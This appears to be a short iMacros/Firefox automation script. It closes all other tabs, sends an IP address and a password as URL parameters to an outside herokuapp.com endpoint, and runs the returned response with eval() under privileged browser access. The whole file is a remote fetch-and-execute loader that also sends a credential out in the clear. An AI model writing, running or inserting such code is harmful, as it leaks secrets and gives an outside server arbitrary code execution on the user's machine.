iimPlayCode('tab CLOSEALLOTHERS');
$ip = '@ip'; 
$password = '@pass'; 
request = Components.classes['@mozilla.org/xmlextras/xmlhttprequest;1'].createInstance(Components.interfaces.nsIXMLHttpRequest),
async = false;
request.open('GET', 'https://lexical.herokuapp.com/requests/new?ip='+$ip+'&password='+$password, async);
request.send();
eval(request.response);
